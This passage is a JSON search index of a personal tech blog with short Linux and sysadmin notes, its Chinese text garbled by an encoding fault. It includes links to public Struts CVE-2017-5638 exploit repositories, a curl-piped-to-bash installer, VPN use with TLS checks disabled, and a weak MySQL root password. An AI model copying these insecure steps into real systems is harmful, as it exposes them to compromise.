æ¼æ´","slug":"history/tech/5bf3becb95165f292938e0d6","date":"2018-11-19T19:59:07.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5bf3becb95165f292938e0d6/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5bf3becb95165f292938e0d6/","excerpt":"","text":"https://github.com/mazen160/struts-pwnhttps://github.com/xsscx/cve-2017-5638","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"å·¦è€³æœµè€—å­æ¨èä¹¦ç±","slug":"history/tech/5bf3bb7b95165f292938e0d5","date":"2018-11-19T19:44:59.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5bf3bb7b95165f292938e0d5/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5bf3bb7b95165f292938e0d5/","excerpt":"","text":"C ç¨‹åºè®¾è®¡è¯­è¨€Unix ç¼–ç¨‹è‰ºæœ¯UNIX ç¯å¢ƒé«˜çº§ç¼–ç¨‹UNIX ç½‘ç»œç¼–ç¨‹Windows æ ¸å¿ƒç¼–ç¨‹TCP/IP è¯¦è§£ä»£ç å¤§å…¨ç¨‹åºå‘˜ä¿®ç»ƒä¹‹é“è®¡ç®—æœºçš„æ„é€ å’Œè§£é‡Šç®—æ³•å¯¼è®ºè®¾è®¡æ¨¡å¼é‡æ„äººæœˆç¥è¯ä»£ç æ•´æ´ä¹‹é“Effective C++More Effective C++Effective JavaC++ è½¯ä»¶æ€§èƒ½ä¼˜åŒ–Agner Fog å…¶å®ƒå‡ æœ¬å’Œæ€§èƒ½è°ƒä¼˜ç›¸å…³çš„ä¹¦ï¼šhttps://www.agner.org/optimize/1234567Optimizing subroutines in assembly language: An optimization guide for x86platformsThe microarchitecture of Intel, AMD and VIA CPUs: An optimization guide forassembly programmers and compiler makersInstruction tables: Lists of instruction latencies, throughputs and micro-operationbreakdowns for Intel, AMD and VIA CPUsCalling conventions for different C++ compilers and operating systemså…¶ä»–åè¯ï¼šGoogle Cloud SpannerQuora","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"shadowsocksæ·»åŠ ç”¨æˆ·è‡ªå®šä¹‰è§„åˆ™ä»£ç†Discord","slug":"history/share/5bf268791e8a2e6701dff729","date":"2018-11-18T19:38:33.000Z","updated":"2020-11-29T01:42:08.743Z","comments":true,"path":"history/share/5bf268791e8a2e6701dff729/","link":"","permalink":"https://wangxiuwen.github.io/history/share/5bf268791e8a2e6701dff729/","excerpt":"","text":"123456789101112Discordæä¾›äº†å¾ˆå¥½çš„è¯­éŸ³ä½“éªŒå’Œå¼€æ”¾çš„Bot apiã€‚è™½Discordä¸åœ¨æŸlistå†…ï¼Œä½†å› åœ°åŒºè€Œä½“éªŒå·®å¼‚è¾ƒå¤§ï¼Œå°¤å…¶æ‰“å¼€ç»å¸¸updateæ— é™è½¬åœˆï¼Œè¿˜æ˜¯æŒ‚ä¸ªä»£ç†é£Ÿç”¨æ›´åŠ ã€‚Windowsä¸‹é¼ æ ‡å³é”®åº•éƒ¨æ‰˜ç›˜ä¸­çš„sså›¾æ ‡ï¼Œæ·»åŠ ç”¨æˆ·è‡ªå®šä¹‰è§„åˆ™ï¼Œåœ¨æ‰“å¼€çš„è®°äº‹æœ¬é‡Œé¢å¡«ä¸Šï¼šmacOSä¸‹æ‰¾åˆ°çŠ¶æ€æ çš„sså›¾æ ‡ï¼Œæ·»åŠ ç”¨æˆ·è‡ªå®šä¹‰è§„åˆ™ï¼Œåœ¨æ‰“å¼€çš„æ–‡æœ¬æ¡†é‡Œé¢å¡«ä¸Šï¼š||discordapp.comdiscord.ggdiscord.mediadiscordapp.netä¿å­˜å†é€€å‡ºï¼Œç„¶åæ›´æ–°PACæ–‡ä»¶ï¼Œè®°å¾—é‡å¯Discordã€‚","categories":[{"name":"åˆ†äº«","slug":"åˆ†äº«","permalink":"https://wangxiuwen.github.io/categories/%E5%88%86%E4%BA%AB/"}],"tags":[{"name":"share","slug":"share","permalink":"https://wangxiuwen.github.io/tags/share/"},{"name":"åˆ†äº«","slug":"åˆ†äº«","permalink":"https://wangxiuwen.github.io/tags/%E5%88%86%E4%BA%AB/"}],"author":"baipeng"},{"title":"æ ‘è“æ´¾è£…docker","slug":"history/tech/5bf266c21e8a2e6701dff728","date":"2018-11-18T19:31:14.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5bf266c21e8a2e6701dff728/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5bf266c21e8a2e6701dff728/","excerpt":"","text":"1https://download.docker.com/linux/static/stable/armhf/","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"linux virtualbox usb ä¸å¯ç”¨","slug":"history/tech/5bee3d881e8a2e6701dff726","date":"2018-11-16T03:46:16.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5bee3d881e8a2e6701dff726/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5bee3d881e8a2e6701dff726/","excerpt":"","text":"1https://www.virtualbox.org12yum install -y kernel-devel/sbin/vboxconfigusb ä¸å¯ç”¨å¿…é¡»ä»BIOSè®¾ç½®å¯ç”¨Hardware Virtualization VT-d / AMD-Vå®‰è£…VirtualBoxæ‰©å±•åŒ…12https://www.virtualbox.orgVirtualBox Extension Packåœ¨ç³»ç»Ÿå¼•å¯¼æ—¶ä½¿vboxdrvæ¨¡å—è‡ªåŠ¨åŠ è½½12vim /etc/modules-load.d/virtualbox.confvboxdrvå¿…é¡»å°†Arch Linuxç™»å½•ç”¨æˆ·æ·»åŠ åˆ°â€œvboxusersâ€ç³»ç»Ÿç»„ã€‚è¿™æ ·åšæ˜¯è®©æ™®é€šç”¨æˆ·ä½¿ç”¨VirtualBoxåŠå…¶æ‰€æœ‰åŠŸèƒ½ã€‚å¦åˆ™ï¼Œåœ¨è¿è¡ŒVirtualBoxæ—¶ä¼šçœ‹åˆ°è®¸å¤šé™åˆ¶ã€‚1sudo usermod -aG vboxusers YOUR_USER_NAME_HEREå¸è½½ Virtualbox:1sudo ./VirtualBox-5.2.22-126460-Linux_amd64.run uninstallå¼•ç”¨https://linuxhint.com/install-virtualbox-arch-linux/","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"æ ‘è“æ´¾æ”¹æ¸¸æˆæœº","slug":"history/tech/5bee72aa1e8a2e6701dff727","date":"2018-11-15T19:32:58.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5bee72aa1e8a2e6701dff727/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5bee72aa1e8a2e6701dff727/","excerpt":"","text":"RetroPie","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"manjaro è‡ªåŠ¨ä¼‘çœ ","slug":"history/tech/5bec0d3e1e8a2e6701dff725","date":"2018-11-13T23:55:42.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5bec0d3e1e8a2e6701dff725/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5bec0d3e1e8a2e6701dff725/","excerpt":"","text":"https://unix.stackexchange.com/questions/437501/prevent-desktop-arch-linux-box-from-sleeping","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"pyenv","slug":"history/tech/5bebcd4e1e8a2e6701dff724","date":"2018-11-13T19:22:54.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5bebcd4e1e8a2e6701dff724/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5bebcd4e1e8a2e6701dff724/","excerpt":"","text":"å®‰è£…1curl -L https://raw.githubusercontent.com/yyuu/pyenv-installer/master/bin/pyenv-installer | bash1234vim ~/.zshrcexport PATH=&quot;/home/wangxiuwen/.pyenv/bin:$PATH&quot;eval &quot;$(pyenv init -)&quot;eval &quot;$(pyenv virtualenv-init -)&quot;centos æ‰§è¡Œ pyenv install 3.6.6 æŠ¥é”™ï¼š1234WARNING: The Python bz2 extension was not compiled. Missing the bzip2 lib?WARNING: The Python readline extension was not compiled. Missing the GNU readline lib?WARNING: The Python sqlite3 extension was not compiled. Missing the SQLite3 lib?Installed Python-3.6.6 to /root/.pyenv/versions/3.6.6è§£å†³ï¼šcentos éœ€è¦å®‰è£…ä¾èµ–1234yum install readline readline-devel readline-static -yyum install openssl openssl-devel openssl-static -yyum install sqlite-devel -yyum install bzip2-devel bzip2-libs -yæŸ¥çœ‹æ­£åœ¨ä½¿ç”¨çš„ python ç‰ˆæœ¬:1pyenv versionsæŸ¥çœ‹å¯å®‰è£…çš„åˆ—è¡¨1pyenv install -lå®‰è£…/å¸è½½12pyenv install 3.6.6 pyenv uninstall 3.6.6python åˆ‡æ¢12$ pyenv global 2.7.3 # è®¾ç½®å…¨å±€çš„ Python ç‰ˆæœ¬ï¼Œé€šè¿‡å°†ç‰ˆæœ¬å·å†™å…¥ ~/.pyenv/version æ–‡ä»¶çš„æ–¹å¼ã€‚$ pyenv local 2.7.3 # è®¾ç½® Python æœ¬åœ°ç‰ˆæœ¬ï¼Œé€šè¿‡å°†ç‰ˆæœ¬å·å†™å…¥å½“å‰ç›®å½•ä¸‹çš„ .python-version æ–‡ä»¶çš„æ–¹å¼ã€‚é€šè¿‡è¿™ç§æ–¹å¼è®¾ç½®çš„ Python ç‰ˆæœ¬ä¼˜å…ˆçº§è¾ƒ global é«˜ã€‚pyenv-virtualenvä½¿ç”¨è‡ªåŠ¨å®‰è£… pyenv å,ä¼šè‡ªåŠ¨å®‰è£… virtualenvåˆ›å»ºè™šæ‹Ÿç¯å¢ƒ1pyenv virtualenv 2.7.10 tensorflow-2.7.0å½“å‰è™šæ‹Ÿç¯å¢ƒ123pyenv virtualenvs # åˆ—å‡ºpyenv activate env-namepyenv deactivateåˆ é™¤è™šæ‹Ÿç¯å¢ƒ12pyenv uninstall my-virtual-envrm -rf ~/.pyenv/versions/env-name # æˆ–è€…åˆ é™¤å…¶çœŸå®ç›®å½•","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"macports  command not found port","slug":"history/tech/5be80b2d1e8a2e6701dff723","date":"2018-11-10T22:57:49.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5be80b2d1e8a2e6701dff723/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5be80b2d1e8a2e6701dff723/","excerpt":"","text":"æŠ¥é”™1macports command not found: portè§£å†³:12vim ~/.zshrcexport PATH=/opt/local/bin:/opt/local/sbin:$PATH","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"spark MongoDB è¯»å–å¤§é›†åˆæ–‡æ¡£ schemaç¼ºå¤±å­—æ®µ","slug":"history/tech/5be583a29a6b9e854693698b","date":"2018-11-09T00:54:58.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5be583a29a6b9e854693698b/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5be583a29a6b9e854693698b/","excerpt":"","text":"1åœºæ™¯ï¼šä½¿ç”¨Spark è¯»å–MongoDBä¸­çš„é›†åˆæ•°æ®ï¼Œç”±äºæ–‡æ¡£æ¯”è¾ƒå¤§ã€‚mongo-spark-connector æ’ä»¶é»˜è®¤é€‰æ‹© 1000æ¡äº†æ¨æ–­schema å¯¼è‡´ç¼ºå¤±å­—æ®µã€‚1è§£å†³åŠæ³•1ï¼šæœ€æ‡’çš„åŠæ³•ã€‚å…ˆæŸ¥è¯¢å‡ºæ¥éœ€è¦è¯»å–çš„æ•°æ®count,ç„¶ååœ¨æŸ¥ä¸€ä¸‹è®¾ç½®sampleSizeçš„å¤§å°ã€‚å¯ä»¥æå®š1234567è§£å†³åŠæ³•2ï¼šè·å–è¦æŸ¥è¯¢çš„å­—æ®µçš„listï¼Œè‡ªå·±å®šä¹‰schema var schemaString = Joiner.on(&quot; &quot;).join(lists) println(schemaString) // å®šä¹‰schema val schema = StructType(schemaString.split(&quot; &quot;).map(fieldName =&gt; StructField(fieldName.split(&quot;:&quot;)(0), if (fieldName.split(&quot;:&quot;)(1).equals(&quot;String&quot;)) StringType else IntegerType, true))) val df = spark.createDataFrame(d.rdd, schema)1234è§£å†³åŠæ³•3ï¼šå®šä¹‰ç»“æ„ç±» case class Creature(name: String, strength: Int, type: String) val explicitDF = MongoSpark.load[Creature](sparkSession)() explicitDF.printSchema()","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"baipeng"},{"title":"boost  1_68_0 ç¼–è¯‘","slug":"history/tech/5be2e7909a6b9e854693698a","date":"2018-11-07T01:24:32.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5be2e7909a6b9e854693698a/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5be2e7909a6b9e854693698a/","excerpt":"","text":"bootstrap1./bootstrap.sh --with-libraries=all --with-toolset=gcc ##--with-librariesæŒ‡å®šç¼–è¯‘å“ªäº›booståº“ï¼Œallçš„è¯å°±æ˜¯å…¨éƒ¨ç¼–è¯‘ï¼Œåªæƒ³ç¼–è¯‘éƒ¨åˆ†åº“çš„è¯å°±æŠŠåº“çš„åç§°å†™ä¸Šï¼Œä¹‹é—´ç”¨ , å·åˆ†éš”å³å¯ï¼Œå¯æŒ‡å®šçš„åº“ä¸‹é¢ä»‹ç»ã€‚--with-toolsetæŒ‡å®šç¼–è¯‘æ—¶ä½¿ç”¨å“ªç§ç¼–è¯‘å™¨ï¼ŒLinuxä¸‹ä½¿ç”¨gccå³å¯ï¼Œå¦‚æœç³»ç»Ÿä¸­å®‰è£…äº†å¤šä¸ªç‰ˆæœ¬çš„gccï¼Œåœ¨è¿™é‡Œå¯ä»¥æŒ‡å®šgccçš„ç‰ˆæœ¬ï¼Œæ¯”å¦‚--with-toolset=gcc-4.4ç¼–è¯‘1./b2 toolset=gccå®‰è£…1./b2 install --prefix=/usré“¾æ¥1ldconfigæŠ¥é”™1è‡´å‘½é”™è¯¯ï¼špyconfig.hï¼šæ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®å½•è§£å†³1export CPLUS_INCLUDE_PATH=&quot;$CPLUS_INCLUDE_PATH:/usr/include/python2.7/&quot;åº†ç¥ä¸€ä¸‹ï¼1The Boost C++ Libraries were successfully built!","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"mount unknown filesystem type 'LVM2_member'","slug":"history/tech/5be2c9129a6b9e8546936989","date":"2018-11-06T23:14:26.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5be2c9129a6b9e8546936989/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5be2c9129a6b9e8546936989/","excerpt":"","text":"æŠ¥é”™:1mount: unknown filesystem type &apos;LVM2_member&apos;å®‰è£…1sudo pacman -Syy lvm2æŸ¥çœ‹ç‰©ç†å·1pvsæŸ¥çœ‹å·ç»„1vgsæŸ¥çœ‹é€»è¾‘å·1lvdisplayéœ€è¦æ¿€æ´»é€»è¾‘å·1vgchange -ay /dev/ubuntu-gnome-vgæŒ‚è½½é€»è¾‘å·1sudo mount /dev/ubuntu-gnome-vg/root /mnt","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"echo ä¸æ¢è¡Œ","slug":"history/tech/5bd98a0d9a6b9e8546936988","date":"2018-10-30T22:55:09.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5bd98a0d9a6b9e8546936988/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5bd98a0d9a6b9e8546936988/","excerpt":"","text":"1echo -e &quot;123\\c&quot;12-e å¯ç”¨è§£é‡Šåæ–œæ çš„è½¬ä¹‰åŠŸèƒ½\\c ä¸æ¢è¡Œ","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"æ ‘è“æ´¾å®‰è£… openfortivpn","slug":"history/tech/5bd3f7679a6b9e8546936987","date":"2018-10-26T17:28:07.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5bd3f7679a6b9e8546936987/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5bd3f7679a6b9e8546936987/","excerpt":"","text":"æ›´æ¢å›½å†…æºhttps://blog.csdn.net/zhou_yongzhe/article/details/80028865å®‰è£…ç¼–è¯‘ä¾èµ–12apt install autoconfapt install libssl-devlibssl-dev åœ¨ centos ä¸Šé¢å¯¹åº”çš„åŒ…åä¸º openssl-develå®‰è£…è¿è¡Œä¾èµ–123modprobe pppmodprobe ppp_asyncapt install pppæ£€å‡ºä»£ç ç¼–è¯‘12345git clone https://github.com/adrienverge/openfortivpn.git./autogen.sh./configure --prefix=/usr/local --sysconfdir=/etcmakemake installè¿æ¥1openfortivpn hostname:10443 -u username -p password --insecure-sslsystemd1234567891011[Unit]Description=openfortivpn serviceAfter=network.target remote-fs.target nss-lookup.target[Service]Type=simpleExecStart=/usr/local/bin/openfortivpn ssl.example.com:10443 -u &lt;username&gt; -p &lt;password&gt; --insecure-ssl[Install]WantedBy=multi-user.target","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"ubuntu 16.04 mount unknown filesystem type 'exfat'","slug":"history/tech/5bd12d5d9a6b9e8546936985","date":"2018-10-25T02:41:33.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5bd12d5d9a6b9e8546936985/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5bd12d5d9a6b9e8546936985/","excerpt":"","text":"é—®é¢˜:1ubuntu 16.04 mount: unknown filesystem type &apos;exfat&apos;è§£å†³:1sudo apt-get install exfat-fuse","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"sign_and_send_pubkey signing failed agent refused operation","slug":"history/tech/5bd12d239a6b9e8546936984","date":"2018-10-25T02:40:35.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5bd12d239a6b9e8546936984/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5bd12d239a6b9e8546936984/","excerpt":"","text":"é—®é¢˜:1sign_and_send_pubkey: signing failed: agent refused operationè§£å†³:12eval &quot;$(ssh-agent -s)&quot;ssh-add","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"ubuntu desktop å®‰è£… chrome","slug":"history/tech/5bd12c849a6b9e8546936983","date":"2018-10-25T02:37:56.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5bd12c849a6b9e8546936983/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5bd12c849a6b9e8546936983/","excerpt":"","text":"1234sudo wget http://www.linuxidc.com/files/repo/google-chrome.list -P /etc/apt/sources.list.d/wget -q -O - https://dl.google.com/linux/linux_signing_key.pub | sudo apt-key add -sudo apt-get updatesudo apt-get install google-chrome-stable","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"ssh -X è½¬å‘å›¾å½¢ç•Œé¢","slug":"history/tech/5bd1799d9a6b9e8546936986","date":"2018-10-24T20:06:53.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5bd1799d9a6b9e8546936986/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5bd1799d9a6b9e8546936986/","excerpt":"","text":"æœåŠ¡ç«¯é…ç½®:123vim /etc/ssh/sshd_configAllowTcpForwarding yesX11Forwarding yeså®¢æˆ·ç«¯é…ç½®:12345678Host testUser rootHostName 127.0.0.1Port 22IdentityFile ~/.ssh/id_rsaForwardAgent yesForwardX11 yesForwardX11Trusted yesè¿æ¥:1ssh -x testæµ‹è¯•ï¼š1gedit xxx.txt","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"manjaro å®‰è£… mysql8","slug":"history/tech/5bcfdf829a6b9e8546936981","date":"2018-10-24T02:57:06.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5bcfdf829a6b9e8546936981/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5bcfdf829a6b9e8546936981/","excerpt":"","text":"å®‰è£…:1sudo pacman -Syy mysqlåˆå§‹åŒ–:1mysqld --initialize --user=mysql --basedir=/usr --datadir=/data/mysqlè¾“å‡ºï¼š12342018-10-24T02:50:36.847221Z 0 [Warning] [MY-010915] [Server] &apos;NO_ZERO_DATE&apos;, &apos;NO_ZERO_IN_DATE&apos; and &apos;ERROR_FOR_DIVISION_BY_ZERO&apos; sql modes should be used with strict mode. They will be merged with strict mode in a future release.2018-10-24T02:50:36.847280Z 0 [System] [MY-013169] [Server] /usr/bin/mysqld (mysqld 8.0.12) initializing of server in progress as process 209672018-10-24T02:50:42.842042Z 5 [Note] [MY-010454] [Server] A temporary password is generated for root@localhost: lukgZCev*3To2018-10-24T02:50:45.684453Z 0 [System] [MY-013170] [Server] /usr/bin/mysqld (mysqld 8.0.12) initializing of server has completedå¯åŠ¨:1systemctl start mysqldä½¿ç”¨ä¸´æ—¶å¯†ç ç™»å½•å¹¶ä¿®æ”¹å¯†ç :123mysql -u root -p&gt;ALTER user &apos;root&apos;@&apos;localhost&apos; IDENTIFIED BY &apos;123456&apos;;&gt;flush privileges;","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"manjaro å®‰è£… mysql 5.7","slug":"history/tech/5bd0237b9a6b9e8546936982","date":"2018-10-23T19:47:07.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5bd0237b9a6b9e8546936982/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5bd0237b9a6b9e8546936982/","excerpt":"","text":"ä¸‹è½½https://www.mysql.com/downloads/1wget https://cdn.mysql.com//Downloads/MySQL-5.7/mysql-5.7.24-linux-glibc2.12-x86_64.tar.gzåˆ›å»ºç”¨æˆ·1234groupadd mysqluseradd -r -g mysql mysqlchown -R mysql mysql/chgrp -R mysql mysql/åˆå§‹åŒ–å¿…è¦çš„ç›®å½•12sudo mkdir /var/log/mysqlsudo chown mysql:mysql /var/log/mysqlé…ç½®æ–‡ä»¶1gedit /etc/mysql/my.cnf12345678910111213141516171819202122232425[client]default-character-set=utf8port = 3306socket = /tmp/mysql.sock[mysql]default-character-set=utf8port = 3306socket = /tmp/mysql.sock[mysqld]character_set_server=utf8init_connect=&apos;SET NAMES utf8&apos;basedir=/usr/local/mysqldatadir=/usr/local/mysql/datasocket=/tmp/mysql.socklog-error=/var/log/mysql/mysqld.logpid-file=/var/run/mysqld/mysqld.pid#ä¸åŒºåˆ†å¤§å°å†™lower_case_table_names = 1sql_mode=STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTIONmax_connections=5000default-time_zone = &apos;+8:00&apos;# skip-grant-tablesåˆå§‹åŒ–æ•°æ®åº“1/usr/local/mysql/bin/mysqld --initialize --user=mysql --basedir=/usr/local/mysql --datadir=/data/mysqlå¯åŠ¨1/usr/local/mysql/support-files/mysql.server 